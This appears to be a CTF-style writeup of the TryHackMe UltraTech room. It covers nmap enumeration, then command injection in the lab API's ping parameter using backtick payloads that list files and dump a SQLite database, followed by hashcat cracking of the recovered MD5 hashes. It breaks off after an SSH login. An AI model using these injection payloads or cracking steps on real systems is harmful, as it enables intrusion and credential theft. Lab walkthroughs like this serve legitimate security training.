<h1> TryHackMe UltraTech writeup - Medium </h1>

The basics of pentration testing, enumeration, privlilege escaltion, and webapp testing

## Part 1 - Enumeration

The first thing im going to do is run an nmap scan on the target IP address (10.10.208.199).

<p><span style="color:green"><em>
Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-27 18:11 BST
Nmap scan report for ip-10-10-208-199.eu-west-1.compute.internal (10.10.208.199)
Host is up (0.00089s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
8081/tcp open  blackice-icecap
MAC Address: 02:3C:7E:9D:8D:85 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds
</em></span></p>



### Which software is using the port 8081?

- To find this I did an nmap scan looking for the service and version (-sV) specificly on port 8081.
    - `nmap -sV 10.10.208.199`

<p><span style="color:green"><em>
PORT     STATE SERVICE VERSION
8081/tcp open  http    Node.js Express framework
MAC Address: 02:3C:7E:9D:8D:85 (Unknown)
</em></span></p>

From this we can see that the software running is Node.js.

### Which other Non-standard port is used?
- To find this, I ran an nmap scan that scans all ports rather than just the top 1000
    - `nmap 10.10.208.199 -p-`

<p><span style="color:green"><em>
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
</em></span></p>

From this we can see that 31331 is the other non standard port running.

### Which software using this port?
- To find this, I ran an nmap scan that looks for the service and version (-sV) on port 31331.
    - `nmap -sV 10.10.208.199 -p 31331`

<p><span style="color:green"><em>
PORT      STATE SERVICE VERSION
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:3C:7E:9D:8D:85 (Unknown)
</em></span></p>

From this we can see that Apache is the software using this port.

### Which GNU/Linux distribution seems to be used?
- To find this we can use the nmap scan from above.
- We can see that Ubuntu is the GNU/Linux distribution being used.

### The software using the port 8081 is a RESTapi, how many of its routes are used by the web application?
- To find this we can use an nmap scan that goes into more detail, -A.
    - `nmap -A 10.10.208.199 -p 8081`

<p><span style="color:green"><em>
PORT     STATE SERVICE VERSION
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 02:3C:7E:9D:8D:85 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (97%), Linux 3.8 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%),
Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%),
Linux 3.10 (92%), Linux 3.19 (92%), Linux 3.2 - 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms ip-10-10-208-199.eu-west-1.compute.internal (10.10.208.199)
</em></span></p>

From this we can see there are 2 Rest api's; _http-cors, and _http-title. 

## Part 2 - Explotation

### There is a database lying around, what is its filename?
- To start off, I opened my web browser and went to http://10.10.208.199:8081. The only thing to pop up is
  UltraTech API v0.1.3, which might be vulnerable. Im going to look at the other port before attempting to exploit this one.
- When looking at http://10.10.208.199:31331, we find a somewhat sophisticated looking webpage.
  Upon futher inspection on the Aboutus page we find a list of potential users.

<p><span style="color:green"><em>
John McFamicom | r00t
Francois LeMytho | P4c0
Alvaro Squalo | Sq4l
</em></span></p>

-Continuing on, we find a contact page that throws a 404 error. it also shows that apache version 2.4.29 which might come in handy if that version is vulnerable. 
- The next thing I look at is the robots.txt file, this leads me to /utech_sitemap.txt. Continuing to follow this path leads us to find.

<p><span style="color:green"><em>
/
/index.html
/what.html
/partners.html
</em></span></p>

- /partners.html seems interesting as it wasnt on the main page. Upon further invesigation we find that this is a login page. Looking into the .html code we find a custom written api file "api.js":

```.js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

- Im relativly new to api's but by analyzing the code we see that the function getAPIURL returns the domain name of the web host port 8081. Then then function checkAPIStatus goes to the url http://10.10.90.74:8081/ping?ip=10.10.90.74 . Which might be worth looking into before moving forward.
- After going to that web address, we can see that it returns the ping command. This looks like a form of remote code execution. Returned ping:
<p><span style="color:green"><em>
PING 10.10.90.74 (10.10.90.74) 56(84) bytes of data. 64 bytes from 10.10.90.74: icmp_seq=1 ttl=64 time=0.037 ms --- 10.10.90.74 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.037/0.037/0.037/0.000 ms
</em></span></p>
- The first thing I do is try to find out where I am in the system, I do this by running the command pwd
	- http://10.10.90.74:8081/ping?ip=`pwd`, this is the output:
<p><span style="color:green"><em>
ping: /home/www/api: Temporary failure in name resolution 
</em></span></p>
- We can see that our wokring directory is /home/www/api
- Now we can start looking around and trying to find the database filename. 
- The next command im going to run is a simple ls
	- http://10.10.90.74:8081/ping?ip=`ls`, this is the output:
<p><span style="color:green"><em>
ping: utech.db.sqlite: Name or service not known 
</em><</span></p>
- Great! the name of the database is utech.db.sqlite

### What is the first user's password hash?
- To find the first user's password hash I belive we should try to look in the ultratech database file. To do this I will use the same method I did to find the database.
	- http://10.10.90.74:8081/ping?ip=`cat utech.db.sqlite`
 <p><span style="color:green"><em>
ping: ) \ufffd\ufffd\ufffd(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
 </em><</span></p>   

From this we can see that the username and password hash.

<p><span style="color:green"><em>
r00t 	: f357a0c52799563c7c7b76c1e7543a32
admin	: 0d0ea5111e3c1def594c1684e3b9be84
</em></span></p>

### what is the password associated with this hash?

- To find the hash values, I will use hashcat.
	- hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
<p><span style="color:green"><em>
r00t	: n100906
admin	: mrsheafy
</em></span></p>

## Part 3 - Gathering Intel 

### what are the first 9 characters of the root user's private SSH key?

- The first thing im going to do is log into the ssh server using the user:pass we found in the last section.
- The admin account doesnt work for the ssh server but it might for the :31331/partners.html login page. It brings us to message from lp1 to please look at the servers configuration files.
- r00t is able to log into the ssh server.
-   

  

